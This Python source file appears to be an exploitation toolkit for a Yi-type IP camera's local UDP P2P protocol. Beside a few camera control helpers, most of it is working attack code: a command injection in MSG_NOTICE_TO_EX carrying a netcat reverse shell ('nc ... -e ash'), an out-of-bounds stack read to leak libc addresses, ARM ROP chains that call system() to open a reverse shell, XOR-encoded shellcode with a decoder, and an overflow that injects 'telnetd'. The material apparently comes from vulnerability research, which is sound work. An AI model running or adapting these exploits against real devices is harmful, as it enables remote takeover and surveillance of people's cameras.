import socket
import time
import struct
from yi_packets import *
from hwconf import *
from util import *
from libcloudapi import get_tnp_uid

# Specify the IP address and initial port for the LAN search message
target_ip = "192.168.10.1"
initial_port = 32108

def send_udp_data(data, ip, port):
    # Create a UDP socket
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Pack the data into bytes
    packed_data = bytes(data)

    # Send the data to the specified IP and port
    udp_socket.sendto(packed_data, (ip, port))

    data, (source_ip, source_port) = udp_socket.recvfrom(1024)

    # Close the socket
    udp_socket.close()

    return data, source_ip, source_port


def send_udp_data_no_close(socket, data, ip, port):
    # Pack the data into bytes
    packed_data = bytes(data)

    # Send the data to the specified IP and port
    socket.sendto(packed_data, (ip, port))

    data, (source_ip, source_port) = socket.recvfrom(1024)

    return data, source_ip, source_port


def start_connection(tnp_uid):
    # lan_search_bytes = LAN_SEARCH(0x30, 0x18, 'T206900', 0x9a850, '30316', 0xa2040100).pack()
    lan_search_bytes = LAN_SEARCH_SMOL(0x30, 0x0).pack()
    
    # Receive the response and get the source port
    info(f"Sending LAN_SEARCH packet to port {initial_port}")
    info(get_hexdump(lan_search_bytes))
    response_data, source_ip, source_port = send_udp_data(lan_search_bytes, target_ip, initial_port)

    # Call the function to send the additional message on the same socket using the source port
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    success(f"Received PunchPkt response from port {source_port}:\n{get_hexdump(response_data)}")

    info(f"Using port {source_port} for session")

    # pnchpkt_ex = PUNCHPKT_EX(0x41, 0x2c, 'T206900', 0x9a850, '30316', 0xa2040100, 0x65be3ce2, b'\x0a\x4a\xde\x9b\xc8\xb9\x03\xd8\x93\x7c\x26\x4d\x4e\xde\x2c\x0b').pack()
    pnchpkt_ex = PUNCHPKT(0x41, 0x14, tnp_uid[0], tnp_uid[1], tnp_uid[2]).pack()

    info(f"Sending PUNCHPKT_EX packet to port {source_port}")
    info(get_hexdump(pnchpkt_ex))

    response_data, source_ip, source_port = send_udp_data_no_close(udp_socket, pnchpkt_ex, target_ip, source_port)

    success(f"Received P2PRdy response from port {source_port}:\n{get_hexdump(response_data)}")

    return source_port, udp_socket


def exploit_MSG_NOTICE_TO_EX_cmd_injection(ip, port, key):
    # first get the device param
    device_param = handle_get_device_param_command()

    # now init connection and send sploit packet
    tnp_uid = get_tnp_uid()

    lan_search_bytes = LAN_SEARCH_SMOL(0x30, 0x0).pack()

    pnchpkt_ex = PUNCHPKT(0x41, 0x14, tnp_uid[0], tnp_uid[1], tnp_uid[2]).pack()
    
    # Receive the response and get the source port
    info("Sending LAN_SEARCH packet")
    info(get_hexdump(lan_search_bytes))
    response_data, source_ip, source_port = send_udp_data(lan_search_bytes, target_ip, initial_port)

    # Call the function to send the additional message on the same socket using the source port
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    msg_notice_to_packet = MSG_NOTICE_TO_EX(b'', 
        str(int(time.time())).encode(), tnp_uid[0].encode(), tnp_uid[1], tnp_uid[2].encode(), 87654321, 255, 
        b'{"hw": "' + device_param.encode() + b' & ' + f"nc {ip} {port}".encode() + b' -e ash #", "type": "UPDATE_HW"}')

    msg_notice_to_packet.signature = gen_sha1_hmac(key.encode('utf-8'), 0x10, msg_notice_to_packet.pack()[0x24:] + b'\x00', len(msg_notice_to_packet.pack()[0x24:])+1)

    msg_notice_to_packet_packed = msg_notice_to_packet.pack()
    
    info("Sending MSG_NOTICE_TO_EX packet")
    info(get_hexdump(msg_notice_to_packet_packed))

    response_data, source_ip, source_port = send_udp_data_no_close(udp_socket, msg_notice_to_packet_packed, target_ip, source_port)

    # return source_port, udp_socket
    time.sleep(5)

def create_channel_and_send_message(msgs, tnp_uid):
    source_port, udp_socket = start_connection(tnp_uid)

    for msg in msgs:
        info("Sending message:")
        info(get_hexdump(msg))

        response_data, source_ip, source_port = send_udp_data_no_close(udp_socket, msg, target_ip, source_port)

    udp_socket.close()

    return 


def get_value_from_stack(tnp_uid, offset):
    # first we need to send a message to set the value we want to ma value on the stack
    set_stack_value_message = OOB_READ_SET_PACKET('', offset, 0x0)

    # then we need to actually fetch the value, keep getting responses until the format is right
    get_stack_value_message = IOTYPE_USER_IPCAM_GET_WHITE_LED_TIME(0x1)

    source_port, udp_socket = start_connection(tnp_uid)

    info("Sending OOB-Read IOTYPE_USER_IPCAM_SET_WHITE_LED_TIME message...")
    info(get_hexdump(set_stack_value_message.pack()))
    udp_socket.sendto(set_stack_value_message.pack(), (target_ip, source_port))
    time.sleep(0.1)
    info("Sending IOTYPE_USER_IPCAM_GET_WHITE_LED_TIME message...")
    info(get_hexdump(get_stack_value_message.pack()))
    udp_socket.sendto(get_stack_value_message.pack(), (target_ip, source_port))

    for i in range(100):
        resp = udp_socket.recvfrom(1024)
        if len(resp[0]) == 60:
            success("Found IOTYPE_USER_IPCAM_GET_WHITE_LED_TIME response...")
            info(get_hexdump(resp[0]))
            break

    # once we have the value, extract it and return the value we fetches
    pointer_bytes_from_packet = resp[0][-4:]
    return udp_socket, source_port, int.from_bytes(pointer_bytes_from_packet, byteorder='little')


def get_values_from_stack(tnp_uid, offsets):
    source_port, udp_socket = start_connection(tnp_uid)
    leaked_pointers = []
    index = 0

    for offset in offsets:
        # first we need to send a message to set the value we want to ma value on the stack
        set_stack_value_message = OOB_READ_SET_PACKET('', offset, index)
        set_stack_value_message.offset = offset
        index+=1

        # then we need to actually fetch the value, keep getting responses until the format is right
        get_stack_value_message = IOTYPE_USER_IPCAM_GET_WHITE_LED_TIME(index)
        index+=1

        info("Sending OOB-Read IOTYPE_USER_IPCAM_SET_WHITE_LED_TIME message...")
        info(get_hexdump(set_stack_value_message.pack()))
        udp_socket.sendto(set_stack_value_message.pack(), (target_ip, source_port))
        time.sleep(0.1)
        info("Sending IOTYPE_USER_IPCAM_GET_WHITE_LED_TIME message...")
        info(get_hexdump(get_stack_value_message.pack()))
        udp_socket.sendto(get_stack_value_message.pack(), (target_ip, source_port))

        for i in range(100):
            resp = udp_socket.recvfrom(1024)
            if len(resp[0]) == 60:
                success("Found IOTYPE_USER_IPCAM_GET_WHITE_LED_TIME response...")
                info(get_hexdump(resp[0]))
                break

        # once we have the value, extract it and return the value we fetches
        pointer_bytes_from_packet = resp[0][-4:]
        leaked_pointers.append(int.from_bytes(pointer_bytes_from_packet, byteorder='little'))
    return udp_socket, source_port, leaked_pointers

# for generating a reverse shell ROP payload
def generate_stack_overflow_ROP_payload(pad_count, ip, port, libc_base):
    system_libc = libc_base + 0x4b4fc
    exit_libc = libc_base + 0x46c30

    # ROP Chain for reverse shell
    payload = b'a' * pad_count

    # Do the stack overflow and execute arbitrary command
    payload += (libc_base + 0x4a5e0).to_bytes(4, byteorder='little') # pc

    # | 0x4a5e0 | ldmia sp!,{r3,pc} |
    payload += (libc_base + 0x313f8).to_bytes(4, byteorder='little') # r3 - copy r2 into r0
    payload += (libc_base + 0x32c24).to_bytes(4, byteorder='little') # pc

    # | 0x32c24 | add r2,sp,#0x3c | blx r3 |

    # | 0x313f8 | cpy r0,r2 | ldmia sp!,{r4,pc} |
    payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r4
    payload += (system_libc).to_bytes(4, byteorder='little') # pc
    payload += b"Aa0Aa1Aa" # padding
    payload += (libc_base + 0x184f4).to_bytes(4, byteorder='little') # pc

    # | 0x184f4 | mov r0,#0x1 | ldmia sp!,{r4,pc} |
    payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r4
    payload += (exit_libc).to_bytes(4, byteorder='little') # pc

    payload += b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab" # padding
    payload += f"nc {ip} {port} -e ash #".encode() # command to execute as system

    return payload


# for generating a reverse shell ROP payload
def generate_smaller_size_stack_overflow_ROP_payload(pad_count, libc_base):
    system_libc = libc_base + 0x4b4fc
    exit_libc = libc_base + 0x46c30

    # ROP Chain
    of_string = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'
    payload = pad_count * b'e'

    # Do the stack overflow and execute arbitrary command
    payload += (libc_base + 0x4a5e0).to_bytes(4, byteorder='little') # pc

    # | 0x4a5e0 | ldmia sp!,{r3,pc} |
    payload += (libc_base + 0x36f30).to_bytes(4, byteorder='little') # r3
    payload += (libc_base + 0x428dc).to_bytes(4, byteorder='little') # pc

    # | 0x428dc | mov r0,#0x5f | ldmia      sp!,{r4,pc} 
    payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r4
    payload += (libc_base + 0x4b9d8).to_bytes(4, byteorder='little') # pc

    # | 0x4b9d8 | cpyne r2,r0 | ldmia      sp!,{r4,r5,pc} | 
    payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r4
    payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r5
    payload += (libc_base + 0x4b0d4).to_bytes(4, byteorder='little') # pc

    # | 0x4b0d4 | add r0,sp,#0xc | add r1,px,r1 | blx        r3
    
    # | 0x36f30 | subs r0,r0,r2 | ldmiane    sp!,{r4,pc} 
    payload += (libc_base + 0x3012c).to_bytes(4, byteorder='little') # r4
    payload += (libc_base + 0x14108).to_bytes(4, byteorder='little') # pc

    # | 0x14108 | cpy r1,r7  | mov r2, 0x1 | add r3, r8, 0x14 | blx        r4

    # | 0x3012c | str r1,[r0,#0x4c] | ldmiale    sp!,{r3,r4,r5,pc} 
    payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r3
    payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r4
    payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r5
    payload += (system_libc).to_bytes(4, byteorder='little') # pc

    return payload

# for generating a reverse shell ROP payload

## Register state before we hit the overflow:

def generate_smaller_size_stack_overflow_ROP_payload_attempt_2(pad_count, libc_base):
    system_libc = libc_base + 0x4b4fc
    exit_libc = libc_base + 0x46c30

    # ROP Chain
    payload = pad_count * b'e'

    # Do the stack overflow and execute arbitrary command
    payload += (libc_base + 0x46028).to_bytes(4, byteorder='little') # pc

    # | 0x46028    | cpy r0,r6   | ldmia      sp!,{r4,r5,r6,pc}
    payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r4
    payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r5
    payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r6
    payload += (libc_base + 0x291f4).to_bytes(4, byteorder='little') # pc

    # | 0x291f4     | add r0,r0,#0x1   | ldmia      sp!,{r4,pc}
    payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r4
    payload += (libc_base + 0x2f6bc).to_bytes(4, byteorder='little') # pc

    # | 0x2f6bc     | str r3,[r0,#0x50]    | ldmiane    sp!,{r4,r5,r6,r7,pc}
    payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r4
    payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r5
    payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r6
    payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r7
    payload += (system_libc).to_bytes(4, byteorder='little') # pc

    return payload

# **WORKING BUT SMALL**
# def generate_smaller_size_stack_overflow_ROP_payload_attempt_2(pad_count, libc_base):
#     system_libc = libc_base + 0x4b4fc
#     exit_libc = libc_base + 0x46c30

#     # ROP Chain
#     payload = pad_count * b'e'

#     # Do the stack overflow and execute arbitrary command
#     payload += (libc_base + 0x46028).to_bytes(4, byteorder='little') # pc

#     # | 0x46028    | cpy r0,r6   | ldmia      sp!,{r4,r5,r6,pc}
#     payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r4
#     payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r5
#     payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r6
#     payload += (libc_base + 0x291f4).to_bytes(4, byteorder='little') # pc

#     # | 0x291f4     | add r0,r0,#0x1   | ldmia      sp!,{r4,pc}
#     payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r4
#     payload += (libc_base + 0x302b4).to_bytes(4, byteorder='little') # pc

#     # | 0x302b4     | str r3,[r0,#0x14]    | ldmia      sp!,{r4,pc}
#     payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r4
#     payload += (system_libc).to_bytes(4, byteorder='little') # pc
#     payload += b"Aa0Aa1Aa" # padding
#     payload += (libc_base + 0x184f4).to_bytes(4, byteorder='little') # pc

#     # | 0x184f4 | mov r0,#0x1 | ldmia sp!,{r4,pc} |
#     payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r4
#     payload += (exit_libc).to_bytes(4, byteorder='little') # pc

#     return payload


def exploit_IOTYPE_USER_IPCAM_SET_AP_MODE_REQ_stack_overflow(ip, port):
    socket, source_port, leaked_ptr = get_value_from_stack(get_tnp_uid(), 0x260)
    success(f"Found pointer: {hex(leaked_ptr)}")
    libc_base = leaked_ptr - 0x5234F
    info(f"/lib/libuClibc-0.9.33.2.so base address: {hex(leaked_ptr-0x5234F)}")

    payload = generate_stack_overflow_ROP_payload(44, ip, port, libc_base)

    # Finally send the payload
    info("Sending IOTYPE_USER_IPCAM_SET_AP_MODE_REQ overflow payload")
    wifi_pwd_overflow = IOTYPE_USER_IPCAM_SET_AP_MODE_REQ('', 0x1, '', payload, 0x2)
    info(get_hexdump(wifi_pwd_overflow.pack()))
    socket.sendto(wifi_pwd_overflow.pack(), (target_ip, source_port))
    success("Done!")


def exploit_IOTYPE_USER_IPCAM_SET_WIFI_INFO_stack_overflow():
    socket, source_port, leaked_ptr = get_value_from_stack(get_tnp_uid(), 0x260)
    success(f"Found pointer: {hex(leaked_ptr)}") 
    libc_base = leaked_ptr-0x5234F
    info(f"/lib/libuClibc-0.9.33.2.so base address: {hex(leaked_ptr-0x5234F)}")

    # payload = generate_smaller_size_stack_overflow_ROP_payload(31, libc_base)
    payload = generate_smaller_size_stack_overflow_ROP_payload_attempt_2(39, libc_base)
    # badchars:     ' ', '='
    # goodchars:    '_', '$', '/', '', '-'

    # run this first for this command <- cp /etc/jffs2/nuke.aac /tmp/a
    # command_string = b'/usr/bin/ak_adec_demo${IFS}48000${IFS}2${IFS}aac${IFS}/tmp/a'
    command_string = b'/usr/bin/testptz'
    command_string += b';'
    command_string += b'f'*(65-len(command_string))

    # Finally send the payload
    info("Sending IOTYPE_USER_IPCAM_SET_WIFI_INFO overflow payload")
    # wifi_pwd_overflow = IOTYPE_USER_IPCAM_SET_WIFI_INFO('', 0x1, b'a'*51 + b'reboot&rld1234', b'bing' + payload, b'c', 0x2)
    wifi_pwd_overflow = IOTYPE_USER_IPCAM_SET_WIFI_INFO('', 0x1, command_string, payload, b'c', 0x2)
    info(get_hexdump(wifi_pwd_overflow.pack()))
    socket.sendto(wifi_pwd_overflow.pack(), (target_ip, source_port))
    success("Done!")


def exploit_IOTYPE_USER_IPCAM_SET_DEVICE_PARAM_REQ_global_stack_overflow(ip, port):
    udp_socket, source_port, leaked_ptr = get_value_from_stack(get_tnp_uid(), 0x260)
    success(f"Found pointer: {hex(leaked_ptr)}")
    libc_base = leaked_ptr - 0x5234F
    info(f"/lib/libuClibc-0.9.33.2.so base address: {hex(leaked_ptr-0x5234F)}")

    payload = generate_stack_overflow_ROP_payload(81, ip, port, libc_base)

    set_packet = UNCAPPED_IOTYPE_USER_IPCAM_SET_DEVICE_PARAM_REQ('', 
        b'HW=1112131550211001800100000000000000000000000000000000000000000000' + payload, 2)
    get_packet = IOTYPE_USER_IPCAM_GET_DEVICE_PARAM_REQ(3)

    info("Sending IOTYPE_USER_IPCAM_SET_DEVICE_PARAM_REQ message...")
    info(get_hexdump(set_packet.pack()))
    udp_socket.sendto(set_packet.pack(), (target_ip, source_port))
    time.sleep(0.1)
    info("Sending IOTYPE_USER_IPCAM_GET_DEVICE_PARAM_REQ message...")
    info(get_hexdump(get_packet.pack()))
    udp_socket.sendto(get_packet.pack(), (target_ip, source_port))

    success("Done!")

def as_javascript_array(payload):
    return_string = '\t'
    for i in range(len(payload)-1):
        return_string += hex(payload[i]) + ', '
        if i%4 == 3:
            return_string += '\n\t'
    return_string += hex(payload[len(payload)-1]) + '\n'
    return return_string


def xor_bytes(data, key):
    """XOR each byte in data with the constant key."""
    xored_data = bytes([byte ^ key for byte in data])
    return xored_data


def generate_light_on_shellcode_payload(payload_start, libc_base, target_length):
    key = 0xfc

    # first build payload so that we can give the decoder the correct lengths
    payload_asm = f"""
        ldr r1, =#0x3bfe8
        mov r0, #0x1
        blx r1
        ldr r1, =#{hex(libc_base+0x49c74)}
        mov r0, #0x10
        blx r1
    """

    payload_assembled = asm(payload_asm, arch='arm', endian="little")

    info("Decoded payload:")
    info(get_hexdump(payload_assembled))

    payload_assembled_bytes = xor_bytes(bytes.fromhex(payload_assembled.hex()), key)

    # get decoder first
    decoder_asm = f"""
        @ Inputs: 
            @ r1: Length of the input array 
            @ r3: Address of sleep in libc
            @ r6: Address of the input array 
            @ r7: Current position
            @ r8: Key for XOR operation

        xor_decode:
            ldmia sp!,{{r3, r4, r5, r6, r7, r8}}
            mov r1, #{hex(len(payload_assembled_bytes))}
            mov r8, #{hex(key)}
            mov r7, r1
        loop:
            ldrb r4, [r6], #1         @ Load byte from input array and increment pointer
            eor r4, r4, r8            @ XOR with the key
            strb r4, [r6, #-1]        @ Store the result back in the array (decrementing pointer)
            subs r7, r7, #1           @ Decrement loop counter
            sub r2, r7, #1            @ Subtract 1 from loop counter and check if result is positive or zero
            bpl loop                  @ If positive or zero, repeat the loop
        sleep:
            mov r5,#0x5
            stmdb sp!,{{r5,lr}}
            ldmia sp!,{{r0,lr}}
            add sp,sp,#0x1000
            blx r3
    """

    # Assemble the ARM code
    decoder_assembled = asm(decoder_asm, arch='arm')

    # Print the assembled machine code
    decoder_assembled_bytes = bytes.fromhex(decoder_assembled.hex())
    info("Decoder:")
    info(get_hexdump(decoder_assembled_bytes))

    # build payload
    payload = decoder_assembled_bytes + payload_assembled_bytes
    payload += (target_length - len(payload)) * b'\x41'

    info("Constructed payload:")
    info(get_hexdump(payload))

    if ((0xa in payload) or (0x0 in payload)):
        info("BAD CHARS!!!! Needs a reboot :'(")

    return payload


def get_sonic_bug_1_frida_hook(payload_start, libc_base):
    payload_bytes = b'\x62\x0A\x41\x41\x41'

    payload_bytes += generate_light_on_shellcode_payload(payload_start, libc_base, 100)

    payload_bytes += (payload_start).to_bytes(4, byteorder='little') # need to make this nice packed bytes (this is pc) (should make it thumb might be easier)

    # end with the bind key bit
    payload_bytes += (libc_base+0x49c74).to_bytes(4, byteorder='little') # address of sleep libc
    payload_bytes += (0xdeadbeef).to_bytes(4, byteorder='little')
    payload_bytes += (0xdeadbeef).to_bytes(4, byteorder='little')
    payload_bytes += (payload_start+0x3c).to_bytes(4, byteorder='little') # address of payload to decode
    payload_bytes += b'\x0A\x70\x00'

    return 'args[0].writeByteArray([\n' + as_javascript_array(payload_bytes) + ']);'


def get_sonic_bug_2_frida_hook():
    bind_key = b'CN' + b'a' * 62 + b' & telnetd;'
    ssid = b'wifi_1C98B0'
    pwd = b'hell0world'

    # send in a large bind key, overflow the did, make command do something interesting
    payload_bytes = bind_key + b'\n' + ssid + b'\n' + pwd

    info(f"Payload length: {len(payload_bytes)}")

    if len(payload_bytes) >= 128:
        info("TOO BIG!!")

    return 'let payload = [\n' + as_javascript_array(payload_bytes) + '];'


def generate_sonic_bug_1_overflow_frida_hook():
    # socket, source_port, leaked_ptr = get_value_from_stack(0x260)
    socket, source_port,  leaked_ptrs = get_values_from_stack(get_tnp_uid(), [0x420,0x260])

    # we can derives some useful pointers from the leaks :)
    payload_start = leaked_ptrs[0] + 0x46F8268 # this is the location the payload ends up
    libc_base = leaked_ptrs[1] - 0x5234F # this is the libc base pointer

    success(f"""Leaked Addresses:
\tLeaked stack pointer:  {hex(leaked_ptrs[0])}
\tTarget PC:             {hex(leaked_ptrs[0] + 0x46F8268)}
\tLeaked libc pointer:   {hex(leaked_ptrs[1])}
\tLibc base:             {hex(leaked_ptrs[1] - 0x5234F)}
""")

    success(f"Generated javascript payload for frida hook:\n\n {get_sonic_bug_1_frida_hook(payload_start, libc_base)}\n\n")

    success("Done!")


def generate_sonic_bug_2_overflow_frida_hook():
    success(f"Generated javascript payload for frida hook:\n\n {get_sonic_bug_2_frida_hook()}\n\n")

    success("Done!")


def set_device_param_poc():
    info("Sending IOTYPE_USER_IPCAM_SET_DEVICE_PARAM_REQ global overflow poc")
    packet = UNCAPPED_IOTYPE_USER_IPCAM_SET_DEVICE_PARAM_REQ('', b'HW=1112131550211001800100000000000000000000000000000000000000000000' + 60*b'a'+b'\n'+b'abcd')

    # Send off packet
    if (packet != b''):
        source_port, udp_socket = start_connection(get_tnp_uid())
        udp_socket.sendto(packet.pack(), (target_ip, source_port))
        success("Message sent!")


def handle_light_command(state):
    if state == 'on':
        info("Sending IOTYPE_USER_IPCAM_SET_DOUBLE_LIGHT on")
        packet = IOTYPE_USER_IPCAM_SET_DOUBLE_LIGHT('', 0x1)
    else:
        info("Sending IOTYPE_USER_IPCAM_SET_DOUBLE_LIGHT off")
        packet = IOTYPE_USER_IPCAM_SET_DOUBLE_LIGHT('', 0x0)

    send_command(packet)

def handle_move_command(direction):
    if direction == 'stop':
        info("Sending IOTYPE_USER_PTZ_DIRECTION_CTRL_STOP")
        packet = IOTYPE_USER_PTZ_DIRECTION_CTRL_STOP()
    if direction == 'up':
        info("Sending IOTYPE_USER_PTZ_DIRECTION_CTRL up")
        packet = IOTYPE_USER_PTZ_DIRECTION_CTRL('', 0x1)
    if direction == 'down':
        info("Sending IOTYPE_USER_PTZ_DIRECTION_CTRL down")
        packet = IOTYPE_USER_PTZ_DIRECTION_CTRL('', 0x2)
    if direction == 'left':
        info("Sending IOTYPE_USER_PTZ_DIRECTION_CTRL left")
        packet = IOTYPE_USER_PTZ_DIRECTION_CTRL('', 0x3)
    if direction == 'right':
        info("Sending IOTYPE_USER_PTZ_DIRECTION_CTRL right")
        packet = IOTYPE_USER_PTZ_DIRECTION_CTRL('', 0x4)

    send_command(packet)

def handle_jump_command(vertical, horizontal):
    info("Sending IOTYPE_USER_PTZ_JUMP_TO_POINT")
    packet = IOTYPE_USER_PTZ_JUMP_TO_POINT('', -horizontal, -vertical)
    send_command(packet)

def handle_restart_command():
    info("Sending IOTYPE_USER_IPCAM_RESTART_DEVICE")
    packet = IOTYPE_USER_IPCAM_RESTART_DEVICE()
    send_command(packet)

def handle_get_device_param_command():
    info("Sending IOTYPE_USER_IPCAM_GET_DEVICE_PARAM_REQ off")
    packet = IOTYPE_USER_IPCAM_GET_DEVICE_PARAM_REQ()

    source_port, udp_socket = start_connection(get_tnp_uid())
    udp_socket.sendto(packet.pack(), (target_ip, source_port))
    success("Message sent!")

    hardware_config_string = ''

    for i in range(100):
        resp = udp_socket.recvfrom(1024)
        if len(resp[0]) == 184:
            success("Found IOTYPE_USER_IPCAM_GET_DEVICE_PARAM_REQ response...")
            info(get_hexdump(resp[0]))

            hw_string_pos = resp[0].index(b'HW=')+3
            hw_string_len = 64

            hardware_config_string = resp[0][hw_string_pos:hw_string_pos + hw_string_len].decode()

            success(f"Hardware config string: {hardware_config_string}")

            HwConf(hardware_config_string).display_values()

            break
    return hardware_config_string

def handle_get_device_info_command():
    info("Sending IOTYPE_USER_IPCAM_DEVINFO_REQ")
    packet = IOTYPE_USER_IPCAM_DEVINFO_REQ()

    source_port, udp_socket = start_connection(get_tnp_uid())
    udp_socket.sendto(packet.pack(), (target_ip, source_port))
    success("Message sent!")

    for i in range(100):
        resp = udp_socket.recvfrom(1024)
        if len(resp[0]) == 400:
            success("Found IOTYPE_USER_IPCAM_DEVINFO_REQ response...")
            info(get_hexdump(resp[0][56:]))

            hardware_config_string = resp[0][56:]

            success(f"Device info string: \n{str(DeviceInfo(hardware_config_string))}")

            break
    return

def handle_get_version_command():
    info("Sending IOTYPE_USER_IPCAM_GET_VERSION")
    packet = IOTYPE_USER_IPCAM_GET_VERSION()

    source_port, udp_socket = start_connection(get_tnp_uid())
    udp_socket.sendto(packet.pack(), (target_ip, source_port))
    success("Message sent!")

    decoded_version_string = ''
    for i in range(100):
        resp = udp_socket.recvfrom(1024)
        if b'\x13\x01' in resp[0]:
            success("Found IOTYPE_USER_IPCAM_GET_VERSION response...")
            info(get_hexdump(resp[0]))

            version_string = resp[0][0x38:]

            decoded_version_string = version_string.decode()

            success(f"Version string: \n{version_string.decode()}")

            break
            
    return decoded_version_string

def handle_set_device_param_command(device_param):
    info("Sending IOTYPE_USER_IPCAM_SET_DEVICE_PARAM_REQ off")
    packet = IOTYPE_USER_IPCAM_SET_DEVICE_PARAM_REQ('', device_param.encode())
    send_command(packet)

def send_command(packet_bytes):
    # Send off packet
    if (packet_bytes != b''):
        source_port, udp_socket = start_connection(get_tnp_uid())
        udp_socket.sendto(packet_bytes.pack(), (target_ip, source_port))
        success("Message sent!")
        info(get_hexdump(packet_bytes.pack()))


# def handle_command(command):
#     packet = b''

#     # get packet
#     if command[0] == 'alarm_on':
#         info("Sending IOTYPE_USER_IPCAM_SET_ALARM_SOUND on")
#         packet = IOTYPE_USER_IPCAM_SET_ALARM_SOUND('', 0x1)
#     if command[0] == 'alarm_off':
#         info("Sending IOTYPE_USER_IPCAM_SET_ALARM_SOUND off")
#         packet = IOTYPE_USER_IPCAM_SET_ALARM_SOUND('', 0x0)
#     if command[0] == 'get_alarm_list':
#         info("Sending IOTYPE_USER_IPCAM_GET_ALARM_EVENT_LIST_REQ")
#         packet = IOTYPE_USER_IPCAM_GET_ALARM_EVENT_LIST_REQ('', int(command[1]), int(command[2]))
#     if command[0] == 'get_sd_index':
#         info("Sending IOTYPE_USER_IPCAM_GET_SD_INDEX")
#         packet = IOTYPE_USER_IPCAM_GET_SD_INDEX('', int(command[1]), int(command[2]))
#     if command[0] == 'get_sd_file':
#         info("Sending IOTYPE_USER_IPCAM_GET_SD_FILE")
#         packet = IOTYPE_USER_IPCAM_GET_SD_FILE('', int(command[1]), int(command[2]))

#     send_command(packet)

#     return


def print_cmd_help():
    entries = [
        ["light_on", "Turn the light off"],
        ["light_off", "Turn the light on"],
        ["stop", "Stop moving"],
        ["down", "Start moving down"],
        ["up", "Start moving up"],
        ["left", "Start moving left"],
        ["right", "Start moving right"],
        ["restart", "Restart camera"],
        ["alarm_on", ""],
        ["alarm_off", ""],
        ["get_device_param", "Get the device param"],
        ["set_device_param_default", "Reset device param to default value"],
        ["get_device_info", "Get device info string and parse it"],
        ["jump_to_point horizontal vertical", "Jump to position"],
        ["get_version", "Fetch and display the version string"],
    ]

    info("Cmd help:")
    
    for entry in entries:
        cmd_length = len(entry[0])
        print(f"\033[38;5;45m\t{entry[0]}\033[0m{' ' * (40-cmd_length)}{entry[1]}")